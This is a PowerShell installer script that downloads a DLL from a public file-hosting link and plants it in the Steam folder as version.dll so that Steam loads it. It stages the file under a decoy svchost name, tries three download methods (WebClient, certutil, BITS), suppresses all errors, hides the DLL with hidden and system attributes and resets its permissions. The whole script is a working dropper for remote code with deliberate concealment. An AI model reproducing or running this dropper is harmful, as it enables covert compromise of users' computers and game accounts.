# ============================================================
# install.ps1 - Steam version.dll Ultimate Hider (v3 - ACL Fixed)
# ============================================================

 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ===== Config =====
 $dllUrl     = "https://files.catbox.moe/3eewvo.dll"
 $tempDll    = "$env:TEMP\svchost_helper.tmp"
 $regBackup  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\People"
 $regValue   = "TaskbarContacts"

# ============================================================
# STEP 1: Download DLL (3 methods)
# ============================================================
 $downloaded = $false

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.DownloadFile($dllUrl, $tempDll)
    if ((Test-Path $tempDll) -and ((Get-Item $tempDll).Length -gt 0)) { $downloaded = $true }
} catch { }

if (-not $downloaded) {
    try {
        cmd /c "certutil -urlcache -split -f `"$dllUrl`" `"$tempDll`"" | Out-Null
        if ((Test-Path $tempDll) -and ((Get-Item $tempDll).Length -gt 0)) { $downloaded = $true }
    } catch { }
}

if (-not $downloaded) {
    try {
        Import-Module BITS
        Start-BitsTransfer -Source $dllUrl -Destination $tempDll
        if ((Test-Path $tempDll) -and ((Get-Item $tempDll).Length -gt 0)) { $downloaded = $true }
    } catch { }
}

if (-not $downloaded) { exit 1 }

# ============================================================
# STEP 2: Find Steam
# ============================================================
 $steamDir = $null

 $rp = Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
if ($rp -and $rp.SteamPath) {
    $p = $rp.SteamPath -replace '/', '\'
    if (Test-Path $p) { $steamDir = $p }
}

if (-not $steamDir) {
    $std = "C:\Program Files (x86)\Steam"
    if (Test-Path $std) { $steamDir = $std }
}

if (-not $steamDir) {
    $rp2 = Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue
    if ($rp2 -and $rp2.SteamPath) {
        $p = $rp2.SteamPath -replace '/', '\'
        if (Test-Path $p) { $steamDir = $p }
    }
}

if (-not $steamDir) { exit 1 }

# ============================================================
# STEP 3: Drop DLL (clean any previous ACL/attrib)
# ============================================================
 $destDll = Join-Path $steamDir "version.dll"

if (Test-Path $destDll) {
    attrib -h -s -r $destDll 2>$null
    icacls $destDll /reset 2>$null
    Remove-Item $destDll -Force 2>$null
}

Copy-Item $tempDll $destDll -Force

# ============================================================
# STEP 4: attrib hide (hidden + system, NO readonly - readonly can cause issues)
# ============================================================
attrib +h +s $destDll

# ============================================================
# STEP 5: ACL (Fixed - allow Read+Execute, no deny)
# ============================================================
# Steam needs RX (Read + Execute) to load the DLL
# No deny entries - they override allows in Windows
icacls $destDll /inheritance:r 2>$null
icacls $destDll /grant:r "SYSTEM:(F)" 2>$null
icacls $destDll /grant:r "Administrators:(F)" 2>$null
icacls $destDll /grant:r "Users:(RX)" 2>$null
